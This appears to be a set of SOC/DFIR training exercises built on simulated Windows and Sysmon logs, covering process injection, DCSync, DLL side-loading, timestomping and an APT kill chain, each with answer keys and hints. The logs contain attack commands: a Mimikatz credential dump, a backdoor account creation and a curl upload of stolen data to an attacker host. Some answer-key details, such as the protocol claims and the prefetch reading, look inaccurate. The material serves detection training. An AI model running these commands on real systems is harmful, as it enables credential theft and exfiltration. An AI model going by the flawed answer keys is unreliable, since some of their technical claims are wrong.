topic: Reflective DLL injection into svchost.exe via Sysmon Events 8 and 10

content.question: The following events were collected across two hosts (WORKSTATION-08 and SERVER-APP01) over a 90-second window. Identify (a) the primary attack technique with MITRE ATT&CK sub-technique ID, (b) why svchost.exe is the injection target, (c) the pivot evidence pointing to SERVER-APP01, (d) the specific Sysmon event fields that confirm the injection, and (e) the recommended immediate hunt pivot.
content.log_excerpt:
14:05:22 | WORKSTATION-08 | Sysmon | EventID=1 | Image=C:\Users\dward\AppData\Local\Temp\update_helper.exe | ParentImage=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe | CommandLine=update_helper.exe --install | SHA256=9a7c3e1f...
14:05:23 | WORKSTATION-08 | Sysmon | EventID=10 | SourceImage=C:\Users\dward\AppData\Local\Temp\update_helper.exe | TargetImage=C:\Windows\System32\svchost.exe | TargetPid=1452 | GrantedAccess=0x1fffff | CallTrace=update_helper.exe+0x4a21
14:05:24 | WORKSTATION-08 | Sysmon | EventID=8 | SourceImage=C:\Users\dward\AppData\Local\Temp\update_helper.exe | TargetImage=C:\Windows\System32\svchost.exe | TargetPid=1452 | StartAddress=0x7ff8c3a10000 | StartModule=UNKNOWN
14:05:26 | WORKSTATION-08 | Sysmon | EventID=3 | Image=C:\Windows\System32\svchost.exe | DestinationIp=185.220.101.9 | DestinationPort=443 | SourcePid=1452
14:05:35 | WORKSTATION-08 | Sysmon | EventID=1 | Image=C:\Windows\System32\cmd.exe | ParentImage=C:\Windows\System32\svchost.exe | ParentPid=1452 | CommandLine=cmd.exe /c whoami && ipconfig /all && net view
14:05:38 | WORKSTATION-08 | Sysmon | EventID=3 | Image=C:\Windows\System32\cmd.exe | DestinationIp=10.10.5.20 | DestinationPort=445 | SourcePid=cmd.exe
14:06:00 | SERVER-APP01 | Windows Security | EventID=4624 | TargetUserName=dward | LogonType=3 | AuthenticationPackageName=NTLM | IpAddress=10.10.1.18 | WorkstationName=WORKSTATION-08
14:06:01 | SERVER-APP01 | Sysmon | EventID=1 | Image=C:\Windows\PSEXESVC.EXE | ParentImage=C:\Windows\services.exe | User=NT AUTHORITY\SYSTEM
14:06:02 | SERVER-APP01 | Sysmon | EventID=1 | Image=C:\Windows\System32\cmd.exe | ParentImage=C:\Windows\PSEXESVC.EXE | User=NT AUTHORITY\SYSTEM | CommandLine=cmd.exe /c net user backdoor P@ssw0rd! /add
expected_findings: T1055 — Process Injection: Sysmon EventID=10 (ProcessAccess with GrantedAccess=0x1fffff, which is PROCESS_ALL_ACCESS) followed by EventID=8 (CreateRemoteThread into svchost.exe PID 1452 at StartModule=UNKNOWN) from update_helper.exe confirms reflective DLL injection — the StartModule=UNKNOWN indicator means the thread start address does not correspond to any loaded module on disk, the signature of a reflectively loaded payload

svchost.exe is targeted for injection because it is a highly legitimate, always-running Windows host process that runs multiple service DLLs — injecting into it camouflages C2 communications (EventID=3 shows svchost.exe PID 1452 connecting to 185.220.101.9:443) within traffic that network monitoring tools may whitelist

SERVER-APP01 pivot evidence: cmd.exe spawned by the injected svchost.exe connects to 10.10.5.20 on port 445 (SMB), followed immediately by a LogonType=3 NTLM authentication from WORKSTATION-08's IP (10.10.1.18) on SERVER-APP01 and PSEXESVC.EXE spawning — confirming PsExec lateral movement from the compromised workstation using dward's NTLM credentials (T1021.002)

The attacker creates a backdoor account immediately after gaining SYSTEM access on SERVER-APP01: 'net user backdoor P@ssw0rd! /add' — this persistence action (T1136.001 — Create Account: Local Account) indicates the actor is establishing redundant access in case the injected foothold is detected and removed

Recommended pivot: query all hosts for Sysmon EventID=3 connections to 185.220.101.9 in the past 72 hours to scope C2 breadth; also hunt for any 'net user' executions under PSEXESVC.EXE parent across all servers to identify additional backdoor accounts created in the same campaign
content.sample_solution: The attack chain is: (1) update_helper.exe dropped from a browser process (msedge.exe — likely a drive-by download) on WORKSTATION-08. (2) update_helper.exe opens svchost.exe PID 1452 with PROCESS_ALL_ACCESS (0x1fffff) via EventID=10 and creates a remote thread via EventID=8 — the StartModule=UNKNOWN confirms the thread entry point is a reflectively loaded payload not backed by a disk-mapped module (T1055, reflective DLL injection). (3) The injected payload initiates C2 to 185.220.101.9:443 (Tor exit node range) from the now-trusted svchost.exe process. (4) cmd.exe spawned by the injected svchost makes an SMB connection to 10.10.5.20 (SERVER-APP01), triggering PsExec lateral movement authenticated with dward's NTLM credentials. (5) On SERVER-APP01, the attacker immediately creates a backdoor local account. ATT&CK chain: T1055 → T1071.001 (C2 via HTTPS) → T1021.002 (PsExec) → T1136.001 (Account Creation). Memory forensics priority: RAM image of WORKSTATION-08 svchost.exe PID 1452 to extract the injected DLL for IOC extraction.
content.hint: Sysmon EventID=8 (CreateRemoteThread) with StartModule=UNKNOWN is the definitive injection indicator — a legitimate thread always starts within a module mapped from disk. Trace the TargetPid across all subsequent events to follow what the injected code does.

topic: DCSync attack detection via Event 4662 replication privilege GUIDs

content.question: The following events span two hosts (WS-IT-03 and DC01) over a 3-minute window. Identify (a) the credential-access technique with MITRE ATT&CK sub-technique ID, (b) the specific Event 4662 field values that are the definitive indicators, (c) why the preceding Sysmon events are significant context, (d) what credential material was likely obtained, and (e) two concrete pivot queries an L3 analyst should run immediately.
content.log_excerpt:
11:34:01 | WS-IT-03 | Sysmon | EventID=1 | Image=C:\Windows\Temp\m64.exe | ParentImage=C:\Windows\System32\cmd.exe | CommandLine=m64.exe sekurlsa::logonpasswords | IntegrityLevel=High
11:34:03 | WS-IT-03 | Sysmon | EventID=11 | Image=C:\Windows\Temp\m64.exe | TargetFilename=C:\Windows\Temp\creds.txt | CreationUtcTime=2026-05-09 11:34:03
11:34:10 | WS-IT-03 | Sysmon | EventID=3 | Image=C:\Windows\Temp\m64.exe | DestinationIp=10.10.0.5 | DestinationPort=389 | Protocol=tcp
11:34:12 | WS-IT-03 | Sysmon | EventID=3 | Image=C:\Windows\System32\lsass.exe | DestinationIp=10.10.0.5 | DestinationPort=445 | Protocol=tcp
11:35:01 | DC01 | Windows Security | EventID=4662 | SubjectUserName=itadmin | ObjectType=domainDNS | Properties=%{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} %{1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} | AccessMask=0x100 | ObjectName=DC=corp,DC=local
11:35:02 | DC01 | Windows Security | EventID=4662 | SubjectUserName=itadmin | ObjectType=domainDNS | Properties=%{89e95b76-444d-4c62-991a-0facbeda640c} | AccessMask=0x100 | ObjectName=DC=corp,DC=local
11:35:05 | DC01 | Windows Security | EventID=4662 | SubjectUserName=itadmin | ObjectType=domainDNS | Properties=%{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} %{1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} | AccessMask=0x100 | ObjectName=DC=corp,DC=local
11:36:00 | DC01 | Windows Security | EventID=4624 | TargetUserName=krbtgt | LogonType=3 | AuthenticationPackageName=Kerberos | IpAddress=10.10.1.15
expected_findings: T1003.006 — OS Credential Dumping: DCSync; the definitive Event 4662 indicators are Properties containing GUIDs {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes) and {1131f6ab-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All) on ObjectType=domainDNS with AccessMask=0x100 (DS-Replication right) — these GUID pairs are the precise access-right properties required for DCSync replication and are not used by any legitimate service or DC replication when the subject account is a user (itadmin), not a domain controller machine account

The preceding Sysmon events establish the attack chain: m64.exe (Mimikatz, identified by 'sekurlsa::logonpasswords' command line) running at High integrity on WS-IT-03 first dumps local LSASS credentials to creds.txt (T1003.001), then connects to DC01's LDAP port 389 and SMB port 445 — m64.exe connecting to a domain controller's LDAP port directly is the network precursor pattern for DCSync, where Mimikatz uses the MS-DRSR (Directory Replication Service Remote) protocol over LDAP to replicate NTDS objects

The GUID {89e95b76-444d-4c62-991a-0facbeda640c} in the second 4662 event corresponds to DS-Replication-Get-Changes-In-Filtered-Set, which is required to replicate protected (sensitive) attributes including the krbtgt password hash — together with the subsequent Event 4624 showing Kerberos authentication for the krbtgt account from a workstation IP (not a DC), this strongly indicates the krbtgt hash was extracted and may be used to forge Golden Tickets (T1558.001)

Credential material likely obtained: all domain account NTLM hashes from NTDS.dit via DCSync, and critically the krbtgt hash which enables unlimited Golden Ticket forgery — krbtgt hash compromise requires immediate forest-level response including double rotation of the krbtgt password (must be done twice, 10 hours apart, to invalidate all existing tickets) and review for Golden Ticket use in Kerberos event logs (Event 4769 with anomalous ticket lifetimes)

Two immediate pivot queries: (1) Query all domain controllers for Event 4662 with itadmin as SubjectUserName in the past 72 hours — itadmin may have conducted DCSync from multiple DCs; (2) Hunt all hosts for Event 4624 with AuthenticationPackageName=Kerberos and ticket lifetimes exceeding domain policy (default 10-hour max) in TicketOptions field, which would indicate Golden Ticket usage
content.sample_solution: The attack is DCSync (T1003.006): itadmin (a user account, not a machine account) is performing AD replication requests against DC01 using the MS-DRSR protocol, which normally only domain controllers invoke. Event 4662 fires when a replication-privileged operation is performed on the domain object. The GUIDs {1131f6aa} and {1131f6ab} are the 'DS-Replication-Get-Changes' and 'DS-Replication-Get-Changes-All' extended rights — any account granted these rights can replicate all AD objects including password hashes. Mimikatz's 'lsadump::dcsync' module abuses this via LDAP without touching NTDS.dit on disk. The attack sequence: local credential dump → DCSync → possible Golden Ticket creation (krbtgt hash). Severity: forest-level compromise. Response: isolate WS-IT-03, disable itadmin, rotate krbtgt password twice, audit all privileged accounts for credential exposure.
content.hint: Focus on the Properties GUIDs in Event 4662 — not all 4662 events indicate DCSync. The replication GUIDs {1131f6aa} and {1131f6ab} on ObjectType=domainDNS are the specific indicators. A domain controller machine account performing these operations is normal; a user account is not.

topic: DLL side-loading via signed binary — supply chain variant

content.question: The following events span three hosts in a 10-minute window following a software update deployment. Identify (a) the specific attack technique and MITRE sub-technique ID, (b) the indicator that distinguishes this from a legitimate software update, (c) the evidence of C2 connectivity, (d) the supply-chain relevance of the signing certificate, and (e) the threat-hunting scope query needed.
content.log_excerpt:
09:15:01 | LAPTOP-22 | Sysmon | EventID=1 | Image=C:\Program Files\VendorApp\vendorapp.exe | ParentImage=C:\Windows\System32\msiexec.exe | CommandLine=vendorapp.exe --service | SHA256=3f2a9c01... | Signed=true | SignerName=VendorCorp Inc
09:15:03 | LAPTOP-22 | Sysmon | EventID=7 | Image=C:\Program Files\VendorApp\vendorapp.exe | ImageLoaded=C:\Program Files\VendorApp\vcruntime140.dll | Signed=false | SHA256=8b1d4e72...
09:15:03 | LAPTOP-22 | Sysmon | EventID=7 | Image=C:\Program Files\VendorApp\vendorapp.exe | ImageLoaded=C:\Program Files\VendorApp\version.dll | Signed=false | SHA256=dc3f8a11...
09:15:05 | LAPTOP-22 | Sysmon | EventID=3 | Image=C:\Program Files\VendorApp\vendorapp.exe | DestinationIp=91.195.240.7 | DestinationPort=443 | DestinationHostname=metrics.vendorapp-telemetry.net
09:15:10 | LAPTOP-35 | Sysmon | EventID=7 | Image=C:\Program Files\VendorApp\vendorapp.exe | ImageLoaded=C:\Program Files\VendorApp\version.dll | Signed=false | SHA256=dc3f8a11...
09:15:10 | LAPTOP-35 | Sysmon | EventID=3 | Image=C:\Program Files\VendorApp\vendorapp.exe | DestinationIp=91.195.240.7 | DestinationPort=443
09:20:00 | DESKTOP-09 | Sysmon | EventID=7 | Image=C:\Program Files\VendorApp\vendorapp.exe | ImageLoaded=C:\Program Files\VendorApp\version.dll | Signed=false | SHA256=dc3f8a11...
09:20:05 | DESKTOP-09 | Sysmon | EventID=1 | Image=C:\Windows\System32\cmd.exe | ParentImage=C:\Program Files\VendorApp\vendorapp.exe | CommandLine=cmd.exe /c whoami
expected_findings: T1574.002 — Hijack Execution Flow: DLL Side-Loading; vendorapp.exe (a signed trusted binary) loads version.dll from its own application directory (C:\Program Files\VendorApp\version.dll) — version.dll is a Windows system DLL that should only be loaded from C:\Windows\System32\; when a malicious copy is placed in the application directory, it takes precedence in the DLL search order, causing the signed binary to load the attacker's payload as part of its normal startup

The distinguishing indicator is the unsigned DLL loaded from the application directory: Signed=false for both vcruntime140.dll and version.dll in EventID=7 (ImageLoad) events. Legitimate vendor software bundles either ship signed DLLs or load unsigned redistribution DLLs whose hashes match the vendor's published release manifests. An unsigned version.dll in the VendorApp directory with hash dc3f8a11 appearing identically across three separate hosts (LAPTOP-22, LAPTOP-35, DESKTOP-09) confirms a centrally distributed malicious DLL, not per-machine tampering

C2 evidence: vendorapp.exe connects to 91.195.240.7:443 via hostname metrics.vendorapp-telemetry.net (a typosquat of a real telemetry domain) — the same external IP is contacted from both LAPTOP-22 and LAPTOP-35, confirming this is coordinated C2 infrastructure, not coincidental network activity. On DESKTOP-09, vendorapp.exe spawns cmd.exe (EventID=1 with ParentImage=vendorapp.exe), confirming active code execution via the loaded malicious DLL

Supply-chain relevance: vendorapp.exe is legitimately signed by 'VendorCorp Inc' (SHA256 3f2a9c01 matches the expected binary hash for this version) — the attack did not tamper with the binary itself, only introduced a malicious DLL into the installation directory, likely through the software update packaging process or a compromised update server. This is consistent with T1195.002 (Compromise Software Supply Chain) where the adversary tampers with the distribution mechanism rather than the primary binary

Threat-hunting scope query: search all endpoints for Sysmon EventID=7 where ImageLoaded path contains '\VendorApp\' and Signed=false, grouped by SHA256 — this identifies all hosts running the malicious DLL variant. Additionally hunt for EventID=3 connections from vendorapp.exe to 91.195.240.7 across the full 30-day lookback to determine when the campaign began
content.sample_solution: The attack is T1574.002 (DLL Side-Loading) with a supply-chain delivery mechanism (T1195.002). The signed vendorapp.exe was distributed legitimately but the update package included a malicious version.dll placed in the application directory. Windows DLL search order loads application-directory DLLs before System32 — so vendorapp.exe loads the malicious version.dll instead of the legitimate Windows one, giving the attacker code execution within a trusted, signed process. The malicious DLL immediately initiates C2 and on DESKTOP-09 spawns cmd.exe for interactive access. Three hosts are confirmed compromised with the same DLL hash (dc3f8a11). Response: block 91.195.240.7 at the firewall, push an emergency clean version.dll via endpoint management, quarantine actively C2-communicating hosts, and notify the software vendor of their compromised update pipeline.
content.hint: Compare where version.dll is loaded FROM — a path inside the application directory rather than C:\Windows\System32\ is the DLL side-loading indicator. Then correlate the Signed=false flag with the same DLL hash appearing on multiple hosts.

topic: NTFS timestomping detection via $STANDARD_INFORMATION vs $FILE_NAME discrepancy

content.question: The following timeline entries were extracted using plaso (log2timeline) from a KAPE-collected image of a compromised host. The output is sorted by event time. Identify (a) the anti-forensics technique with MITRE ATT&CK sub-technique ID, (b) the specific artifact fields that prove the manipulation, (c) what the prefetch evidence reveals, (d) the correct actual execution time, and (e) the forensic chain implication for chain-of-custody.
content.log_excerpt:
2026-01-15 08:00:00 | $MFT | $STANDARD_INFORMATION | MACb=MACB | Filename=C:\Windows\Temp\svc_updater.exe | MFT_Entry=148923
2026-01-15 08:00:00 | $MFT | $STANDARD_INFORMATION | MACb=MACB | Filename=C:\Windows\Temp\svc_updater.exe | Attribute=SI_Created
2026-05-09 11:22:14 | $MFT | $FILE_NAME | MACb=macb | Filename=C:\Windows\Temp\svc_updater.exe | Attribute=FN_Created
2026-05-09 11:22:14 | $MFT | $FILE_NAME | MACb=macb | Filename=C:\Windows\Temp\svc_updater.exe | Attribute=FN_Modified
2026-05-09 11:22:18 | Prefetch | svc_updater.exe-A1B2C3D4.pf | ExecutionCount=3 | LastRunTime=2026-05-09 11:22:18 | VolumeCreationTime=2024-03-01
2026-05-09 11:22:20 | $MFT | $STANDARD_INFORMATION | MACb=.a.. | Filename=C:\Windows\Temp\svc_updater.exe | Attribute=SI_LastAccessed
2026-05-09 11:22:22 | $MFT | $STANDARD_INFORMATION | MACb=..cb | Filename=C:\Windows\Temp\svc_updater.exe | Attribute=SI_LastWrite_SI_ChangeTime
expected_findings: T1070.006 — Indicator Removal: Timestomping; the $STANDARD_INFORMATION ($SI) timestamps have been set to 2026-01-15 08:00:00 (a plausible-looking date in the past) while the $FILE_NAME ($FN) timestamps (which cannot be modified via the standard Windows API SetFileTime function) correctly record the true file creation on 2026-05-09 11:22:14 — a $SI / $FN discrepancy of nearly 4 months is definitive evidence of timestomping

$STANDARD_INFORMATION MACb=MACB at 2026-01-15 08:00:00 shows all four MACB timestamps (Modified, Accessed, Changed, Born/Created) set to an identical round time — legitimate files very rarely have all four timestamps equal to the same second, which is a secondary anti-forensics indicator; the $FILE_NAME FN_Created=2026-05-09 11:22:14 is the authoritative creation time because $FN timestamps are updated by the NTFS kernel driver during file operations and cannot be overwritten by user-mode API calls (SetFileTime only modifies $SI)

Prefetch evidence: svc_updater.exe-A1B2C3D4.pf was created with LastRunTime=2026-05-09 11:22:18 — the prefetch file is created or updated the first time a program executes, meaning svc_updater.exe first ran on 2026-05-09 at 11:22:18 UTC with execution count 3 (ran three times); this independently corroborates the $FN creation timestamp and proves the file did not exist on 2026-01-15 as the $SI timestamp falsely implies

True execution timeline: svc_updater.exe was written to C:\Windows\Temp\ on 2026-05-09 11:22:14 UTC (per $FN Created), had its $SI timestamps stomped to 2026-01-15 08:00:00 to evade timeline-based triage, and first executed at 11:22:18 UTC (prefetch) with three total executions; the $SI Last Accessed update at 11:22:20 confirms filesystem-level access after the stomp

Forensic chain implication: the timestamp manipulation constitutes intentional evidence tampering (T1070.006); for chain-of-custody, the forensic examiner must document in the acquisition report that $SI timestamps are unreliable for this file and that $FN and prefetch timestamps are used as authoritative sources; courts and incident response reports relying solely on $SI creation dates (as many automated tools display by default) would place this file 4 months earlier than its actual introduction, potentially exculpating the actual attacker timeframe
content.sample_solution: The NTFS $SI vs $FN timestamp discrepancy is the definitive proof of timestomping (T1070.006). On Windows, the SetFileTime() Win32 API modifies only the $STANDARD_INFORMATION attribute (user-accessible). The $FILE_NAME attribute is updated exclusively by the NTFS kernel driver when the file is created, renamed, or moved — it is not modifiable by user-mode tools. The attack sequence: (1) svc_updater.exe written on 2026-05-09 11:22:14; (2) timestomping tool (e.g., Timestomp, BulkFileChanger) sets $SI timestamps to 2026-01-15 08:00:00; (3) execution begins at 11:22:18 per prefetch. The $FN and prefetch timestamps cannot be faked by standard user-mode timestomping tools, making them reliable forensic anchors. Tool identification: the round timestamp (08:00:00 exactly) and all-equal MACB values are characteristic of Timestomp.exe (Metasploit) or similar tools that set all timestamps to the same value in one call.
content.hint: Compare the $STANDARD_INFORMATION timestamps against the $FILE_NAME timestamps for the same MFT entry — if $SI shows an earlier date than $FN, the $SI was modified after file creation (timestomping). Prefetch provides independent verification of actual first execution time.

topic: Multi-stage APT campaign correlation across three hosts — full kill chain

content.question: The following events span three hosts (EMAIL-GW, LAPTOP-HR-05, DC02) over 90 minutes. Identify (a) the full kill-chain stage for each cluster of events with MITRE ATT&CK technique IDs, (b) the credential escalation pivot, (c) the data staging and exfiltration indicators, (d) two attribution-relevant TTPs, and (e) the recommended post-incident scope confirmation queries.
content.log_excerpt:
13:00:01 | EMAIL-GW | MailAudit | Action=Delivered | Sender=hr-team@acmecorp-info.com | Recipient=mstone@corp.local | Attachment=Q2_Bonus_Review.docm | AttachmentHash=7c4d2a1e...
13:14:22 | LAPTOP-HR-05 | Sysmon | EventID=1 | Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | ParentImage=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE | CommandLine=powershell -w hidden -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAOAA=
13:14:25 | LAPTOP-HR-05 | Sysmon | EventID=3 | Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | DestinationIp=34.107.221.82 | DestinationPort=443
13:14:30 | LAPTOP-HR-05 | Sysmon | EventID=1 | Image=C:\Windows\Temp\svch0st.exe | ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
13:15:00 | LAPTOP-HR-05 | Sysmon | EventID=3 | Image=C:\Windows\Temp\svch0st.exe | DestinationIp=34.107.221.82 | DestinationPort=443 | DestinationHostname=update.cdn-delivery.net
14:02:00 | LAPTOP-HR-05 | Sysmon | EventID=1 | Image=C:\Windows\Temp\m.exe | ParentImage=C:\Windows\Temp\svch0st.exe | CommandLine=m.exe sekurlsa::logonpasswords exit
14:02:05 | LAPTOP-HR-05 | Sysmon | EventID=10 | SourceImage=C:\Windows\Temp\m.exe | TargetImage=C:\Windows\System32\lsass.exe | GrantedAccess=0x1010
14:10:00 | DC02 | Windows Security | EventID=4768 | TargetUserName=svc_backup | IpAddress=10.10.1.42 | TicketOptions=0x40810010
14:10:01 | DC02 | Windows Security | EventID=4624 | TargetUserName=svc_backup | LogonType=3 | AuthenticationPackageName=Kerberos | IpAddress=10.10.1.42
14:45:00 | DC02 | Sysmon | EventID=1 | Image=C:\Windows\Temp\7z.exe | ParentImage=C:\Windows\System32\cmd.exe | CommandLine=7z.exe a -p infected C:\Windows\Temp\archive.7z \\DC02\SYSVOL\corp.local\Policies\
14:55:00 | DC02 | Sysmon | EventID=3 | Image=C:\Windows\System32\curl.exe | DestinationIp=34.107.221.82 | DestinationPort=443 | CommandLine=curl -F file=@C:\Windows\Temp\archive.7z https://update.cdn-delivery.net/upload
expected_findings: Kill chain stages: (1) Initial Access — phishing email (T1566.001) delivering macro-enabled .docm from spoofed HR domain acmecorp-info.com at 13:00 UTC; (2) Execution — malicious macro spawns PowerShell with Base64-encoded command (T1059.001) at 13:14 UTC; (3) C2 establishment — PowerShell downloads svch0st.exe (T1105 Ingress Tool Transfer) and svch0st.exe beacons to 34.107.221.82 via update.cdn-delivery.net (T1071.001); (4) Credential Access — m.exe (Mimikatz) dumps LSASS memory via PROCESS_VM_READ access (0x1010, T1003.001) at 14:02 UTC; (5) Lateral Movement — svc_backup Kerberos TGT requested from LAPTOP-HR-05 IP and used for DC02 access (T1550.003 Pass-the-Ticket or stolen credentials); (6) Collection + Exfiltration — SYSVOL policy files archived with password-protected 7z and exfiltrated via curl to the same C2 domain (T1560.001 Archive Collected Data, T1041 Exfiltration Over C2)

Credential escalation pivot: Mimikatz on LAPTOP-HR-05 extracted svc_backup's Kerberos credentials (cleartext or ticket), which were then used 8 minutes later to authenticate to DC02 (Event 4768 TGT request from the same workstation IP 10.10.1.42 for svc_backup followed by Event 4624 success); svc_backup having access to DC02 indicates it is a privileged service account, and its compromise grants the attacker access to critical infrastructure

Data staging and exfiltration indicators: 7z.exe archives the SYSVOL Policies directory (which contains Group Policy Objects, logon scripts, and potentially credential-containing scripts) into a password-protected archive (T1560.001), then curl.exe uploads the archive directly to 34.107.221.82 via HTTPS using a multipart form POST (curl -F file=@archive.7z) — both 7z.exe and curl.exe executing from DC02 are anomalous; SYSVOL Policies exfiltration is a high-impact event as GPOs contain domain-wide configuration including potential credential hints

Attribution-relevant TTPs: (1) The C2 infrastructure reuse — 34.107.221.82 appears as the initial C2 destination from LAPTOP-HR-05 (svch0st.exe beacon) and also as the exfiltration endpoint from DC02 (curl upload), indicating single-operator infrastructure consistent with a coordinated targeted attack rather than commodity malware; (2) The staged loader pattern — PowerShell download cradle → custom dropper (svch0st.exe) → Mimikatz wrapper (m.exe) with exit flag indicates a multi-stage implant framework consistent with Cobalt Strike or a similar C2 framework's operational pattern

Post-incident scope confirmation queries: (1) Query all email gateway logs for messages received from the acmecorp-info.com domain in the past 90 days to identify additional recipients of the same phishing campaign; (2) Query all endpoints for Sysmon EventID=3 connections to 34.107.221.82 in the past 30 days to identify other compromised hosts beaconing to the same C2 infrastructure
content.sample_solution: This is a full-chain targeted intrusion. Timeline: 13:00 phishing delivery → 13:14 macro execution → 13:14 PowerShell C2 → 14:02 credential dump → 14:10 lateral movement to DC → 14:45 data collection → 14:55 exfiltration. The 90-minute dwell on LAPTOP-HR-05 before moving to DC02 suggests deliberate reconnaissance or waiting for a specific timeframe. The SYSVOL exfiltration is particularly dangerous as Group Policy files may reveal additional privileged account names, configuration weaknesses, or logon scripts containing credentials. Full response scope: (1) Isolate LAPTOP-HR-05 and DC02; (2) Rotate svc_backup credentials; (3) Review all GPO contents for embedded credentials; (4) Block 34.107.221.82 and update.cdn-delivery.net at the perimeter; (5) Run Volatility malfind on LAPTOP-HR-05 to extract svch0st.exe's C2 configuration.
content.hint: Track the C2 IP 34.107.221.82 — if it appears on multiple different hosts at different stages, it anchors the entire campaign to a single operator. Then map each cluster of events to a kill-chain phase and assign ATT&CK technique IDs.
